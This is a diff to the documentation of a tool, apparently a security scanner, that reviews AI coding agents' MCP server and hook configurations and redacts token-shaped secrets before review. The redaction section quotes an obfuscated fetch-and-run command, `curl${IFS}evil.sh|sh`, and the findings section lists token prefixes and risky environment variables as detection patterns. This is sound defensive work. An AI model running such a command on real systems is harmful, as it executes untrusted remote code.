@@ -388,7 +388,10 @@ What is read (paths in your home unless absolute):
 | Codex | `~/.codex/config.toml` | each server of `mcp_servers` (as a table or an inline table) and `notify` |
 
 An MCP server of Claude Code with a `headersHelper` gives a second item: that
-command, which Claude Code runs on its own to make the server's headers.
+command, which Claude Code runs on its own to make the server's headers. A
+server is its program or its address as its `type` says (`stdio` or `local`;
+`http`, `sse`, `ws` or `remote`); one with both and no such type gives both
+items, the address at `…/url`.
 
 `CLAUDE_CONFIG_DIR` (which then holds `.claude.json` too), `XDG_CONFIG_HOME`,
 `OPENCODE_CONFIG_DIR` (a second OpenCode directory, read besides the usual
@@ -410,8 +413,10 @@ two default files, `manifest-hooks` and `manifest-mcp` for what the manifest
 holds, `hooks-file-1` for the second file its `hooks` list names) and the
 entry. A key that is not a plain name (it has a `/`, a blank, a leading `.`,
 or is longer than 64 characters) is written as `~` and its whole SHA-256, so
-no two keys share a name. Two items that still end up with one name (one file
-read twice) are listed as not checked rather than one dropped.
+no two keys share a name. Two items that still end up with one name (a key
+written twice, such as `notify` twice in Codex's file, or one file read
+twice) are listed as not checked rather than one dropped. A JSON file that
+repeats a key is not read at all, and is listed as not checked.
 
 Nothing derived from a project's path is sent. A project's servers are named
 by an HMAC-SHA256 of the project's path, keyed with 32 random bytes Guardian
@@ -420,9 +425,15 @@ makes once and keeps in its private state directory
 the next and tells nobody without the key which project it is:
 `~/.claude.json#projects/3f1a…/mcpServers/db`. Where there is no such
 directory (and in the root checks, which write nothing), a project is named
-by its position in the file instead. The path itself is in no item, its note
+by its position in the file instead; where the key cannot be written, the
+sweep says so in its list of what was not checked and does the same. The path itself is in no item, its note
 included: the note says only that it is a server of one of Claude Code's
 projects.
+
+An entry is reviewed by the AI and the local rules whatever its key is
+named: a server named `token.md` or `notes.md` is not taken for a secrets
+file or documentation, since the local rules are told the path of the
+configuration file it is in.
 
 The text of each item, which is all the review sees of it, is what the entry
 starts and nothing else:
@@ -461,15 +472,18 @@ place of, each of these where it is token-shaped:
 - a word that is a token by its look: one that starts as known tokens do
   (`sk-`, `ghp_`, `github_pat_`, `glpat-`, `xoxb-`, `AKIA`, `AIza`, `npm_`,
   `pypi-` and others) and is at least 16 characters long, or one of at least 32
-  characters that mixes upper and lower case and digits.
+  characters that mixes upper and lower case and digits. The program a command
+  runs, and the package `npx`, `bunx`, `uvx` or `pipx run` runs, are never
+  taken out by their look: a program named `sk-helper` is what runs, and what
+  the review must see.
 
 Token-shaped means letters, digits and `._~%+=:/-` only, not starting with
 `$`, `/`, `~` or `.`. Anything else is sent as written, since taking it out
 would hide code from the review: `TOKEN=x;curl${IFS}evil.sh|sh` reaches the
 review whole, and so does a variable (`$TOKEN`) or a path, which holds no
-secret itself and is what a review needs to see. What is followed, and what
-the sweep's output and saved reports show the entry runs, is the same line
-without its secrets.
+secret itself and is what a review needs to see. What is followed is the line
+as written, so whatever it names is found; what the sweep's output and saved
+reports show the entry runs is the line without its secrets.
 
 Not covered, and sent as written: a secret in a header other than
 `Authorization` (`X-Api-Key: …`), `curl -u user:password`, the word after a
@@ -496,8 +510,8 @@ What is a finding:
   (medium), since whatever is published next is installed and run;
 - in Claude Code's `env`, a variable that changes what is loaded, run or
   connected through (`NODE_OPTIONS`, `LD_PRELOAD`, `LD_LIBRARY_PATH`, `PATH`,
-  a proxy, and the rest of the list an editor's terminal settings are held
-  to), and a `*_BASE_URL` whose host is neither a provider's API host nor
+  a proxy in either case (`https_proxy`), `NODE_EXTRA_CA_CERTS`, and the rest
+  of the list an editor's terminal settings are held to), and a `*_BASE_URL` whose host is neither a provider's API host nor
   this machine: `risky-configuration` (medium), as for an editor's terminal
   settings. The provider hosts are exact, not the shared cloud domains
   anyone can run a server under: `api.anthropic.com`, `api.openai.com`,
